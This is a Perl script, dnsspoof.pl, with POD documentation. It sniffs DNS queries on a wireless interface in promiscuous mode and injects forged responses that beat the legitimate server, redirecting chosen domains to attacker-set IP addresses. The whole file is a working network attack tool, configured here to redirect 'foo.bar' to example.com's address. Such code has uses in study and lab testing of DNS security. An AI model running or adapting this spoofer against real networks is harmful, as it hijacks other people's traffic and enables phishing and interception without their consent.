#!/usr/bin/env perl

use Net::DNS;
use Net::DNS::Packet;
use Net::DNS::RR;
use Net::DNS::Question;
use Net::Frame::Simple;
use Net::Frame::Layer::ETH;
use Net::Frame::Layer::IPv4 ':consts';
use Net::Frame::Layer::UDP;
use Net::Write::Layer2;
use Net::Pcap::Easy;
use v5.36;

my $dev        = 'wlp0s20f3';
my $registered = {
    'foo.bar' => '93.184.215.14', # redirect to example.com
};

sub spoofDNS($question, $answer, $ether, $ip, $udp, $dns) {
    say "$ip->{src_ip} went on $question";

    # create spoofed DNS response
    my $dns_packet = Net::DNS::Packet->new();
    $dns_packet->header->qr(1);
    $dns_packet->header->id($dns->header->id);
    $dns_packet->push(question => Net::DNS::Question->new($question, 'A', 'IN'));
    $dns_packet->push(answer => Net::DNS::RR->new("$question 33 IN A $answer"));
    my $dns_data = $dns_packet->data;

    # wrap the DNS packet (src<->dest)
    $ether = Net::Frame::Layer::ETH->new(src => $ether->{dest_mac}, dst => $ether->{src_mac});
    $ip    = Net::Frame::Layer::IPv4->new(src => $ip->{dest_ip}, dst => $ip->{src_ip}, protocol => NF_IPv4_PROTOCOL_UDP);
    $udp   = Net::Frame::Layer::UDP->new(src => $udp->{dest_port}, dst => $udp->{src_port}, payload => $dns_data);

    # write packet on the wires
    my $oWrite  = Net::Write::Layer2->new(dev => $dev);
    my $oSimple = Net::Frame::Simple->new(layers => [$ether, $ip, $udp]);
    $oWrite->open;
    $oSimple->send($oWrite);
    $oWrite->close;
}

# all arguments to new are optoinal
my $npe = Net::Pcap::Easy->new(
    dev              => $dev,
    filter           => "dst port 53",
    packets_per_loop => 10,
    bytes_to_capture => 1024,
    promiscuous      => 1,

    udp_callback => sub {
        my ($npe, $ether, $ip, $udp, $header) = @_;
        my $dns = Net::DNS::Packet->decode(\$udp->{data});
        if($dns->header->qr == 0){ # if request
            my $question = ($dns->question)[0]->name or return;
            my $answer   = $registered->{$question} or return;
            spoofDNS($question, $answer, $ether, $ip, $udp, $dns);
        }
    },
);
1 while $npe->loop;

__END__

=head1 NAME

dnsspoof - simple dns spoofing Perl script

=head1 SYNOPSIS

    ./dnsspoof.pl

=head1 DESCRIPTION

I<dnsspoof.pl> is a simple perl script to do DNS spoofing, basically send a DNS response faster than the legitimate DNS server to redirect the target to another website.

You can easily change which interface to use with the I<$dev> variable and the domain name to redirect with their linked IP with the I<$registered> variable.

In the current script, only DNS request for I<foo.bar> will be spoofed with the IP of I<example.com> being I<93.184.215.14>.
